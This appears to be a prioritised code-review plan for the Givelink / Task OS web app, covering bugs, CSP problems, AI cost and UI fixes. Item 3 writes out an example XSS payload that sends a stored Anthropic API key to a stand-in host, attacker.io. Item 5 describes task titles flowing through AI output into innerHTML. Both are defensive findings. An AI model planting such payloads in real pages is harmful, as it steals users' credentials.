# Givelink / Task OS — Improvement Plan

Scanned: `index.html` (14 401 lines), `givelink.html` (1 756 lines), `api/claude.js`, `sw.js`, `vercel.json`.

---

## 🔥 P0 — Ship this week (bugs breaking user flows)

### 1. CRM "Delete / Log Activity / Advance Stage" buttons are frozen from first open
- **What:** `_showNPModal` creates its modal HTML once, capturing `editNpId` at that moment. On every subsequent call the modal is reused without rebuilding the footer, so delete/log/advance buttons are either permanently absent (if an "Add Org" happened first) or permanently present (if an edit happened first).
- **Where:** `givelink.html:1358–1401`
- **Why it matters:** Users cannot delete CRM orgs unless the very first modal call was an edit. Any team member who clicks "+ Add Org" before clicking a Kanban card loses access to destructive/activity actions until page reload.
- **Effort:** S
- **Suggested fix:**
  - Move the footer `<div>` out of the one-time `if(!m){...}` template.
  - After the modal exists, set `document.getElementById('npm-footer').innerHTML = editNpId ? '...' : '...'` inside `_showNPModal` on every call, just like the title is updated at line 1390.

### 2. Push notification icons 404 — wrong path in service worker
- **What:** `sw.js` lines 41–42 reference `'./icons/icon-192.png'` for both the notification icon and badge, but the file actually lives at `./icon-192.png` (no `icons/` subdirectory). Every push notification arrives with a broken icon.
- **Where:** `sw.js:40–42`; icon assets are at `./icon-192.png`, `./icon-512.png`
- **Why it matters:** PWA push notifications are a re-engagement touchpoint. A broken icon looks unprofessional and some OSes suppress notifications with missing resources.
- **Effort:** S
- **Suggested fix:**
  - Change both references from `'./icons/icon-192.png'` to `'./icon-192.png'` in the `push` event handler.
  - Bump the `CACHE` version string so the corrected SW is installed immediately.

### 3. XSS via toast — sprint name injected as raw HTML
- **What:** `toast()` in `givelink.html` sets content via `el.innerHTML = msg`. Callers at lines 847 and 1201 pass user-controlled strings directly: `` toast(`"${archive.name}" archived...`) `` — `archive.name` comes from the sprint settings form and is never escaped before this call.
- **Where:** `givelink.html:452` (toast definition), `givelink.html:847` (caller), `givelink.html:1201`
- **Why it matters:** A sprint name like `<img src=x onerror="fetch('//attacker.io?k='+localStorage.getItem('taskos_api_key'))">` would silently exfiltrate the stored Anthropic API key. The CSP allows `'unsafe-inline'` scripts, so the risk is real.
- **Effort:** S
- **Suggested fix:**
  - Change `toast()` to use `el.textContent = msg` (safe for plain text), or add a dedicated `toastHTML(msg)` for the rare callers that pass literal markup.
  - At call sites that embed user data, wrap with the existing `esc()` helper: `toast(\`"${esc(archive.name)}" archived…\`)`.

### 4. Google Fonts (Inter) blocked by CSP — always falling back to system font
- **What:** `index.html` loads Inter via `<link href="https://fonts.googleapis.com/...">` (lines 16–17), but `vercel.json` line 14 sets `style-src 'self' 'unsafe-inline'` and `font-src 'self'`. Neither `fonts.googleapis.com` nor `fonts.gstatic.com` are listed, so the stylesheet request is blocked at the browser level on every page load.
- **Where:** `index.html:14–17` (preconnect + stylesheet), `vercel.json:14` (CSP)
- **Why it matters:** The entire typographic identity of the app — Inter at multiple weights — is silently absent in production. The brand polished look is replaced by the system default on every device.
- **Effort:** S
- **Suggested fix:**
  - Add `https://fonts.googleapis.com` to `style-src` and `https://fonts.gstatic.com` to `font-src` in `vercel.json`.
  - Or self-host Inter (download WOFF2 subsets, add to the repo, serve from `'self'`) for stronger privacy and no external CDN dependency.

### 5. AI Morning Briefing renders raw AI response as innerHTML — prompt injection vector
- **What:** `_renderAIBriefing` at line 11184 does `body.innerHTML = lines.join('<br><br>')` where `lines` contains AI-generated text (e.g. `d.PRIORITY_1`, `d.RELATIONSHIP`). An attacker who can influence the briefing prompt (via task titles, goal names, or a compromised API call) can inject arbitrary HTML that executes in context.
- **Where:** `index.html:11176–11195` (`_renderAIBriefing`), `index.html:11184`
- **Why it matters:** Prompt injection is a practical attack: a task titled `<img src=x onerror=...>` would survive into the briefing. Combined with `'unsafe-inline'` CSP, this is a stored-XSS path.
- **Effort:** S
- **Suggested fix:**
  - Use `el.textContent` for AI-generated text, or apply `esc()` to every AI field before inserting.
  - Wrap AI response fields with `esc()`: `if(d.PRIORITY_1) lines.push(\`🎯 <strong>${esc(d.PRIORITY_1)}</strong>\`);` etc.

---

## ⚡ P1 — High ROI (UX friction blocking conversion or key workflows)

### 6. AI Proxy not wired — all hosted users must paste their own Anthropic key
- **What:** `APP_CONFIG.aiProxy` (index.html:9812) is an empty string. The serverless proxy at `api/claude.js` exists and is deployed on Vercel, but its URL is never configured. Every user who hits an AI feature sees "Add Claude API key in Settings" and must obtain and paste a personal `sk-ant-` key.
- **Where:** `index.html:9812`, `api/claude.js:1–49`
- **Why it matters:** Requiring an Anthropic API key is a hard conversion wall. The proxy was built explicitly to remove this friction. It's deployed but untargeted.
- **Effort:** S
- **Suggested fix:**
  - Set `aiProxy: 'https://<your-app>.vercel.app/api/claude'` in `APP_CONFIG`.
  - The proxy already gates on Supabase session when `SUPABASE_URL` is set.
  - Add Upstash rate limiting (noted in the `api/claude.js` comment) before enabling for public users.

### 7. `window.prompt()` and `confirm()` used for CRM interactions
- **What:** "Log Activity" uses `window.prompt('Log activity (what happened?):')` (line 1431). "Delete org" and "Delete task" use `confirm()` (lines 1425, 732). Native browser dialogs block the main thread, are unstyled, provide no character count or multi-line support, and cannot be keyboard-dismissed without cancelling.
- **Where:** `givelink.html:732`, `givelink.html:1425`, `givelink.html:1431`
- **Why it matters:** "Log Activity" is the core CRM action taken dozens of times per week. A clunky `prompt()` discourages logging and degrades data quality over time.
- **Effort:** M
- **Suggested fix:**
  - Replace `logActivityNP` prompt with an inline textarea inside the existing NP modal, or a small dedicated modal matching the existing `.mo` / `.md` pattern.
  - Replace both `confirm()` calls with the existing `showConfirm()` helper already present in `index.html` — or add a similar one to `givelink.html`.

### 8. AI Sprint Planner calls `claude-opus-4-5` — ~15× more expensive than Haiku
- **What:** `runAiSprintPlanner()` at line 1140 hardcodes `model: 'claude-opus-4-5'`. All other AI calls in the codebase use `claude-haiku-4-5-20251001`. The sprint planner returns a JSON list of 10 task objects — a task well within Haiku's capability.
- **Where:** `givelink.html:1140`
- **Why it matters:** Using Opus for this request costs ~15× more per call. With multiple team members, this could meaningfully inflate API costs for no quality gain on a structured JSON output task.
- **Effort:** S
- **Suggested fix:**
  - Change line 1140 to `model: 'claude-haiku-4-5-20251001'`.
  - Or route through `callClaudeGL()` (line 1256) which defaults to Haiku, removing the duplicated fetch logic at the same time.

### 9. Givelink sprint data lives only in localStorage — no cross-device sync or backup
- **What:** All sprint tasks, CRM nonprofits, and snapshots in `givelink.html` are stored in `localStorage.getItem('givelink_sprint')` only. `index.html` syncs to Supabase, but `givelink.html` has zero cloud persistence — one browser wipe or different device = lost sprint history.
- **Where:** `givelink.html:447–449` (`save()`/`load()`); no Supabase calls anywhere in givelink.html
- **Why it matters:** Sprint data (goals, CRM pipeline, past sprints) is mission-critical. It is currently one `localStorage.clear()` call away from being gone forever.
- **Effort:** M
- **Suggested fix:**
  - Reuse the `_sbEnabled()` / `sbSyncNow()` pattern from `index.html`. Givelink already reads `taskos_profiles` from localStorage, so the Supabase session is already available.
  - Add a second key/table for Givelink state, or store it as a nested field in the existing `app_state.data` JSONB column.

### 10. Burndown chart only snapshots on task completion — misses adds/removes/edits
- **What:** `_recordSnapshot()` is called only from `toggleDone()` (line 737). Adding, editing, or deleting sprint tasks via `saveTask()` or `moveSprint()` never triggers a snapshot, so the burndown has gaps and the `total` count can quietly change between recorded points, making the chart misleading.
- **Where:** `givelink.html:743–753` (`_recordSnapshot`), `givelink.html:730` (`saveTask` — no snapshot call), `givelink.html:739–741` (`moveSprint` — no snapshot call)
- **Why it matters:** The burndown is used to gauge sprint health at a glance. Gaps or silent total changes make it untrustworthy.
- **Effort:** S
- **Suggested fix:**
  - Call `_recordSnapshot()` at the end of `saveTask()` and `moveSprint()` in addition to `toggleDone()`.
  - Or schedule a daily snapshot via a `DOMContentLoaded` check: if the latest snapshot is from a prior day, record one on load.

---

## 🛠 P2 — Code health (tech debt slowing velocity)

### 11. Two parallel Anthropic fetch implementations in givelink.html
- **What:** `runAiSprintPlanner()` (lines 1097–1161) constructs its own `fetch('https://api.anthropic.com/v1/messages', ...)` call with its own key lookup, error handling, and loading state — duplicating `callClaudeGL()` (lines 1256–1272) which does exactly the same thing as a utility.
- **Where:** `givelink.html:1097–1161` vs `givelink.html:1256–1272`
- **Why it matters:** Two code paths means two places to update when the model or auth flow changes. The sprint planner also bypasses the key-lookup fallback chain in `callClaudeGL`.
- **Effort:** S
- **Suggested fix:**
  - Rewrite `runAiSprintPlanner` to call `callClaudeGL(prompt, 1024, 'claude-haiku-4-5-20251001')` and parse the returned string.
  - Delete the duplicated fetch block; key lookup, error handling, and model selection live in one place.

### 12. Hardcoded production business data in seed function
- **What:** `seed()` in `givelink.html` (lines 883–1072, ~190 lines) contains real business tasks with specific details: "Pay Gerald", "O1 Application under legal processing", "Meeting with immigration specialist completed", org outreach notes, grant deadlines, and Greek-language internal notes like "Logo porta anoixti" (line 997).
- **Where:** `givelink.html:883–1072`
- **Why it matters:** Real operational context in source code is a security and privacy concern. If this repo is ever made public (or shared with a contractor/investor), personal and legal matters become visible. It also bloats the file.
- **Effort:** M
- **Suggested fix:**
  - Replace seed with a minimal 3–5 task placeholder set (similar to `_welcomeSeed()` in `index.html`).
  - Import real sprint data via the Settings UI or the planned Supabase sync (item 9 above).

### 13. No per-user rate limiting on the Claude proxy
- **What:** `api/claude.js` acknowledges in its own comment: "For production add per-user rate limiting (e.g. Upstash) so a single account can't run up your Anthropic bill." No guard exists today.
- **Where:** `api/claude.js:12–13`, `api/claude.js:38–48`
- **Why it matters:** One authenticated user (or a compromised Supabase session) can make unlimited `POST /api/claude` calls, exhausting the API budget. With Opus-class prompts via the future proxy, costs could spike quickly.
- **Effort:** M
- **Suggested fix:**
  - Add Upstash Redis rate limiting middleware: e.g. 20 requests/user/hour using the user's JWT `sub` claim as the key.
  - Or use Vercel's built-in edge rate limiting (available on Pro plan).
  - Enforce `max_tokens ≤ 2000` (already done) and add input prompt length cap (already 20 000 chars, reasonable).

### 14. `document.execCommand('copy')` deprecated fallback
- **What:** `givelink.html:1521` and `givelink.html:1621` both have `document.execCommand('copy')` as a fallback when `navigator.clipboard.writeText()` fails. `execCommand` is deprecated in all major browsers and returns `false` in Firefox 98+, Safari 16.4+.
- **Where:** `givelink.html:1521`, `givelink.html:1621`
- **Why it matters:** The fallback silently fails on modern browsers. Copy-to-clipboard is the only way to export AI-generated standup/outreach emails.
- **Effort:** S
- **Suggested fix:**
  - Drop the `execCommand` branch entirely — `navigator.clipboard.writeText()` is now baseline supported.
  - If supporting a very old browser is required, show a `<textarea>` with the text pre-selected and a "Select all" prompt instead.

### 15. `innerHTML +=` in `renderVelocityStats` — double parse + lost event listeners
- **What:** `givelink.html:1551` does `el.innerHTML += \`...\`` which reads the current DOM as a string, appends new HTML, and sets it back — causing the browser to parse the existing content twice and discarding any event listeners on child nodes.
- **Where:** `givelink.html:1544–1553`
- **Why it matters:** This runs every time the overview re-renders. Because `ov-stats` already has 4 stat tiles inserted by `renderOverview()`, the velocity stat append causes 8 DOM elements to be serialized and re-parsed. It's also fragile — a future change to `renderOverview` could break the ordering.
- **Effort:** S
- **Suggested fix:**
  - Move velocity stats into `renderOverview()` itself, building the full `ov-stats` HTML in one pass.
  - Or give velocity tiles their own container `<div id="vel-stats">` separate from `ov-stats`, so each section sets its own innerHTML independently.

---

## 💡 P3 — Nice to have

### 16. Typography inconsistency: Inter (index.html) vs system font (givelink.html)
- **What:** `index.html` loads Inter from Google Fonts (lines 14–17) and declares `font-family: 'Inter', -apple-system, ...`. `givelink.html` uses only `-apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif`. Users switching between the two apps see a noticeable font change.
- **Where:** `givelink.html:21`, `index.html:48`
- **Effort:** S
- **Suggested fix:** Once the CSP/font issue (item 4) is resolved, copy the same `<link>` and font-family declaration into `givelink.html`. Or self-host the subset and share it between both pages.

### 17. Givelink Sprint Board has no light/dark mode toggle
- **What:** `givelink.html` hardcodes a dark color palette in `:root` with no `.light` variant and no preference detection (`prefers-color-scheme`). Users whose OS is in light mode get a jarring dark-only experience, unlike `index.html` which fully supports both.
- **Where:** `givelink.html:15–20` (`:root` CSS vars), no `prefers-color-scheme` media query anywhere in the file
- **Effort:** M
- **Suggested fix:** Add a `@media (prefers-color-scheme: light)` block (or a `.light` class toggled from localStorage, mirroring the pattern in `index.html:2449–2461`) that remaps the key CSS variables to lighter equivalents.

### 18. Burndown chart has no axis labels, tooltips, or date markers
- **What:** The SVG burndown chart at `givelink.html:754–775` renders two polylines (ideal vs actual) with only "Sprint start" and "End" text at the bottom. No Y-axis numbers, no date labels, no hover tooltips. It's hard to read at a glance whether the team is 2 days or 6 days behind.
- **Where:** `givelink.html:754–775`
- **Effort:** M
- **Suggested fix:** Add 3–4 Y-axis labels (0%, 25%, 50%, 100% tasks done), date labels for today's marker on the X-axis, and a `<title>` tooltip on each data point. The SVG is already in the codebase; it just needs a few more `<text>` and `<circle>` elements.

### 19. Givelink Sprint Board color scheme diverges from Givelink brand
- **What:** The Sprint Board uses Tailwind blue (`#3b82f6`) as its primary accent color. `index.html` (Task OS) uses the lavender brand color (`#8b7cff`). Neither matches the Givelink product brand (purple `#6B3FA0`/`#5718CA`). The Sprint Board is shared with team members and surfaces Givelink brand context (pillar names, CRM, goals).
- **Where:** `givelink.html:17` (`--accent:#3b82f6`), compare `index.html:31` (`--accent:#8b7cff`)
- **Effort:** S
- **Suggested fix:** Align givelink.html accent to `--accent:#8b7cff` (matching Task OS) or to the actual product brand purple. Update CSS variable and the 5 pillar color constants (`--gr`, `--np`, `--pr`, `--ex`, `--op`) to ensure no pink sits on a purple background (the `--pr:#f472b6` pillar currently renders pink text on `--sf:#0e1628` dark surface — acceptable contrast, but worth reviewing against brand guidelines).

### 20. iOS PWA detection uses fragile `navigator.userAgent` regex
- **What:** `givelink.html:1675` detects iOS via `/iphone|ipad|ipod/i.test(navigator.userAgent)&&!window.MSStream`. User-agent sniffing is known to be unreliable and was deprecated as a recommended pattern in 2020 (WICG). iPadOS 15+ also reports a desktop UA by default.
- **Where:** `givelink.html:1675`
- **Effort:** S
- **Suggested fix:** Replace with feature detection: `const isIOS = typeof DeviceOrientationEvent !== 'undefined' && typeof DeviceOrientationEvent.requestPermission === 'function'`, or check for `navigator.maxTouchPoints > 1 && !window.MSStream`. The "Add to Home Screen" hint is only needed when not already in standalone mode, which is already checked by the `isInstalled` guard on line 1673.
